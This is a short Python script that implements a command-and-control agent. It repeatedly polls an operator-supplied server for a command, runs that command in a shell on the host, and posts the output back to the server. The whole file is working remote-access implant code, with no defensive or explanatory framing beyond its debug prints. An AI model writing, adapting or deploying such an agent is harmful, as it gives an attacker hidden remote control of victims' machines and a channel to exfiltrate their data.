import sys
import time
import requests
import subprocess

def print_usage():
    print("Usage: agent.py <SERVER_IP> <SERVER_PORT>")

def fetch_command(server_ip, server_port):
    url = f"http://{server_ip}:{server_port}/command"
    print(f"Connecting to URL: {url}")  # Debug output
    try:
        response = requests.get(url)
        response.raise_for_status()
        command = response.json().get("command")
        print(f"Command received: {command}")
        return command
    except requests.RequestException as e:
        print(f"Error fetching command: {e}")
        return None

def report_output(server_ip, server_port, output):
    url = f"http://{server_ip}:{server_port}/report"
    print(f"Reporting output to URL: {url}")  # Debug output
    try:
        response = requests.post(url, json={"output": output})
        response.raise_for_status()
        print("Output reported successfully.")
    except requests.RequestException as e:
        print(f"Error reporting output: {e}")

def main():
    if len(sys.argv) != 3:
        print_usage()
        sys.exit(1)

    server_ip = sys.argv[1]
    server_port = sys.argv[2]

    while True:
        print(f"Checking in with the C2 server at {server_ip}:{server_port}...")
        command = fetch_command(server_ip, server_port)
        
        if command:
            print(f"Executing command: {command}")
            try:
                # Execute the command and capture the output
                result = subprocess.check_output(command, shell=True, text=True)
                print(f"Command output: {result}")
                # Report the output back to the server
                report_output(server_ip, server_port, result)
            except subprocess.CalledProcessError as e:
                error_message = f"Command execution failed: {e}"
                print(error_message)
                # Report the error back to the server
                report_output(server_ip, server_port, error_message)
        else:
            print("No command received or an error occurred.")
        
        # Wait 10 seconds before the next check-in
        time.sleep(10)

if __name__ == "__main__":
    main()
